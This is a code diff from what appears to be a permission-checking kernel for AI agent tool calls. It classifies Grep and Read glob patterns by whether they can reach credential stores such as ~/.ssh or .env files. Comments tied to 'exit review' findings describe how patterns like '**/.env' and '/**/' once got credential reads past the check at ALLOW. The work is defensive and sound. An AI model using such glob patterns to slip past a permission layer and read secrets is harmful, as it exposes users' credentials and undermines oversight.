-    // `glob: '**/.env'` and output_mode "content" PRINTED a credential file at ALLOW (exit review 9). The
-    // tail is classified as the file it names, anywhere the pattern can reach.
-    const tail = reach.split('/').filter(Boolean).pop() ?? '';
-    if (tail && !/[*?[{]/.test(tail)) {
-      const t = classifyPath(table, ctx, 'Read', canonicalPath(resolve(resolvedReach, tail)));
-      if (t.verdict !== 'ALLOW') hits.push({ ...t, via: `${tool} pattern ${reach} names ${tail} (${t.via})` });
-    } else if (tail && !/^[*?]+$/.test(tail)) {
-      // ...AND A WILDCARD TAIL NAMES A SET. `**/.env*` opens `.env`, `.env.local` and `.env.production`, and the
-      // literal test above skipped it because of the `*` (exit review 10). The set is checked against the names a
-      // credential file is actually given, and the strongest answer for any member that matches is the answer.
-      const re = tailGlobRegExp(tail);
-      if (re)
-        for (const name of SECRET_FILE_NAMES)
-          if (re.test(name)) {
-            const t = classifyPath(table, ctx, 'Read', canonicalPath(resolve(resolvedReach, name)));
-            if (t.verdict !== 'ALLOW') {
-              hits.push({ ...t, via: `${tool} pattern ${reach} reaches ${name} (${t.via})` });
-              break;
-            }
-          }
+  for (const abs of bases) {
+    for (const reach of reaches) {
+      // the literal prefix, with the trailing separator removed: `~/.ssh/*` reaches `~/.ssh`, and a path matcher
+      // written as `~/.ssh/**` does not match a string that still ends in a slash
+      const cut = reach.search(/[*?[{]/);
+      const rawLiteral = cut < 0 ? reach : reach.slice(0, cut);
+      // `/**/…` has the literal prefix `/`; stripping its trailing slash collapsed it to `.` — the working
+      // directory — so a pattern that reaches the whole filesystem read as an in-workspace search (exit review 2)
+      const literal = rawLiteral === '/' ? '/' : rawLiteral.replace(/\/+$/, '') || '.';
+      const reachReadings = pathCandidates(abs, literal);
+      if (reachReadings.dynamic) {
+        hits.push(unknownHit(table, ctx, `${tool} pattern ${reach} names a directory this kernel cannot resolve`));
+        continue;
+      }
+      if (reachReadings.uncertain !== null) hits.push(unknownHit(table, ctx, `${tool} pattern ${reach}: ${reachReadings.uncertain}`));
+      for (const reading of reachReadings.paths) {
+        const resolvedReach = canonicalPath(reading);
+        // a wildcard reads INSIDE the literal prefix, so the thing classified is the directory's CONTENTS: a path
+        // matcher written as `~/.ssh/**` describes what is in it, not the directory entry itself
+        // a pattern anchored at `/` or carrying a `..` segment is not bounded by its literal prefix: `/**/.ssh/*`
+        // has the prefix `/` and reaches everything under it (exit review 2)
+        // a `..` segment ANYWHERE in the pattern escapes the literal prefix wherever that prefix resolves, and a
+        // root anchor is unbounded when the prefix is outside every registered root
+        const unbounded =
+          /(^|\/)\.\.(\/|$)/.test(reach) || (reach.startsWith('/') && repoRootFor(ctx, resolvedReach) === null);
+        // classify what the prefix names FIRST: an unbounded reach must never REPLACE a stronger answer, and
+        // `<home>/.ssh/*` is both unbounded and a credential store
+        const byPath = classifyPath(table, ctx, 'Read', cut < 0 ? resolvedReach : resolvedReach + '/');
+        const strongerThanOutside =
+          byPath.via.startsWith('matcher path') || !byPath.capability.startsWith('fs.repo');
+        const r =
+          unbounded && !strongerThanOutside
+            ? {
+                capability: 'fs.outside-workspace.read',
+                verdict: verdictFor(table, ctx, 'fs.outside-workspace.read'),
+                via: 'the pattern is not bounded by a directory inside the workspace',
+                absolute: false,
+              }
+            : byPath;
+        // a reach that leaves every registered root is not the `fs.repo.read` the base claimed it was
+        if (unbounded || r.via.startsWith('matcher path') || !r.capability.startsWith('fs.repo'))
+          hits.push({ ...r, via: `${tool} pattern ${reach} (${r.via})` });
+        // THE PREFIX IS NOT THE ONLY LITERAL PART OF A PATTERN. `**/.env` has NO literal prefix — it reaches the
+        // workspace root, which is ordinary — while its literal TAIL names the file it will actually open, and an
+        // explicit glob overrides both ripgrep's skip-hidden default and .gitignore. So `Grep` with
+        // `glob: '**/.env'` and output_mode "content" PRINTED a credential file at ALLOW (exit review 9). The
+        // tail is classified as the file it names, anywhere the pattern can reach.
+        const tail = reach.split('/').filter(Boolean).pop() ?? '';
+        if (tail && !/[*?[{]/.test(tail)) {
+          const t = classifyPath(table, ctx, 'Read', canonicalPath(`${resolvedReach}/${tail}`));
+          if (t.verdict !== 'ALLOW') hits.push({ ...t, via: `${tool} pattern ${reach} names ${tail} (${t.via})` });
+        } else if (tail && !/^[*?]+$/.test(tail)) {
+          // ...AND A WILDCARD TAIL NAMES A SET. `**/.env*` opens `.env`, `.env.local` and `.env.production`, and the
+          // literal test above skipped it because of the `*` (exit review 10). The set is checked against the names a
+          // credential file is actually given, and the strongest answer for any member that matches is the answer.
+          const re = tailGlobRegExp(tail);
+          if (re)
+            for (const name of SECRET_FILE_NAMES)
+              if (re.test(name)) {
+                const t = classifyPath(table, ctx, 'Read', canonicalPath(`${resolvedReach}/${name}`));
+                if (t.verdict !== 'ALLOW') {
+                  hits.push({ ...t, via: `${tool} pattern ${reach} reaches ${name} (${t.via})` });
+                  break;
+                }
+              }
+        }
+      }
     }
+    if (
+      abs === home ||
+      home.startsWith(abs + '/') ||
+      abs === '/' ||
+      reaches.some((r) => globCouldReachCredentials(abs + '/' + r)) ||
+      (reaches.length === 0 && globCouldReachCredentials(abs + '/'))
+    )
+      hits.push({
+        capability: 'fs.credential-store.read',
+        verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
+        via: `${tool} over ${base} can reach credential stores`,
+        absolute: false,
+      });
   }
-  if (
-    abs === home ||
-    home.startsWith(abs + '/') ||
-    abs === '/' ||
-    reaches.some((r) => globCouldReachCredentials(abs + '/' + r)) ||
-    (reaches.length === 0 && globCouldReachCredentials(abs + '/'))
-  )
-    hits.push({
-      capability: 'fs.credential-store.read',
-      verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
-      via: `${tool} over ${base} can reach credential stores`,
-      absolute: false,
-    });
   return hits;
 }
 
-export function evaluate(
-  table: CompiledAuthorityTable,
-  ctx: EvaluationContext,
-  req: ToolRequest,
-): Evaluation {
+export function evaluate(table: CompiledAuthorityTable, ctx: EvaluationContext, req: ToolRequest): Evaluation {
+  // ONE VIEW OF THE FILESYSTEM PER DECISION: every canonicalisation inside this call shares a cache that is gone when it
+  // returns (see withPathCache), so a physical walk costs each link once and a link made between two calls is seen
+  return withPathCache(() => evaluateRequest(table, ctx, req));
+}
+
+function evaluateRequest(table: CompiledAuthorityTable, ctx: EvaluationContext, req: ToolRequest): Evaluation {
   let hits: CapabilityHit[] = [];
   const tool = req.tool;
   const input = req.input;
